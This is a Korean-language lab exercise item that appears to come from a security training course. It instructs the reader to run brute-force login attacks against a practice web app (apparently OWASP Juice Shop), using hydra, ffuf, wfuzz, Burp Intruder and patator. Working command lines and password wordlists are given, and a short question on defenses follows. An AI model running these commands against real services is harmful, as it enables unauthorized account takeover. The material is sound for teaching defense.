- order: 2
  instruction: |-
    {{WEB_IP}} 대상으로 브루트포스 공격 시뮬레이션을 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 도구 A — hydra (가장 종합)
    설치 (이미 됨): `sudo apt install hydra`. 사용:
    ```bash
    # HTTP form-based brute force
    hydra -l admin@juice-sh.op \
          -P /usr/share/wordlists/rockyou.txt \
          10.20.30.80 \
          http-post-form "/rest/user/login:email=^USER^&password=^PASS^:F=Invalid"
    # -l: 단일 user / -L: user list
    # -P: password list
    # http-post-form 의 :F= 는 실패 메시지 매칭

    # JSON API
    hydra -l admin -P pass.txt 10.20.30.80 \
          http-post-form "/rest/user/login:{\"email\":\"^USER^\",\"password\":\"^PASS^\"}:F=Invalid:H=Content-Type\: application/json"
    ```

    ▶ 2단계: 도구 B — ffuf (빠른 fuzzing)
    ```bash
    ffuf -u http://10.20.30.80/rest/user/login \
         -w pass.txt:PASS \
         -X POST -H 'Content-Type: application/json' \
         -d '{"email":"admin@juice-sh.op","password":"PASS"}' \
         -mc 200 -fc 401  # 200=성공, 401=실패 필터
    ```

    ▶ 3단계: 도구 C — wfuzz (다중 변수)
    ```bash
    wfuzz -c -u http://target/rest/user/login \
          -X POST -H 'Content-Type: application/json' \
          -d '{"email":"FUZZ","password":"FUZ2Z"}' \
          -w users.txt -w pass.txt \
          --hh 401  # 401 응답 hide
    ```

    ▶ 4단계: 도구 D — Burp Intruder (GUI, cluster bomb)
    1. 로그인 요청 → Intruder
    2. email + password 둘 다 §...§ marking
    3. Attack type → **Cluster bomb** (모든 조합)
    4. Payload 1: users / Payload 2: rockyou
    5. Start Attack → 응답 길이 차이로 성공 식별

    ▶ 5단계: 도구 E — patator (다중 protocol 통합)
    ```bash
    sudo apt install patator
    patator http_fuzz url=http://target/login \
            method=POST body='email=admin&password=FILE0' \
            0=pass.txt -x ignore:fgrep='Invalid'
    ```

    ▶ 6단계: 자주 쓰는 wordlist
    | wordlist | 용도 |
    |---|---|
    | `/usr/share/wordlists/rockyou.txt` | 14M 일반 비밀번호 |
    | SecLists `Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | top 1000 |
    | `Passwords/seasons.txt` | 계절+숫자 변형 |
    | CrackStation 사전 (1.5GB, 1.4B passwords) | 가장 큰 |

    ▶ 7단계: 답변
    hydra 또는 ffuf 출력 (성공한 password) quote + rate limit 확인 + 방어 (계정 잠금 / CAPTCHA / MFA) 1 문장.
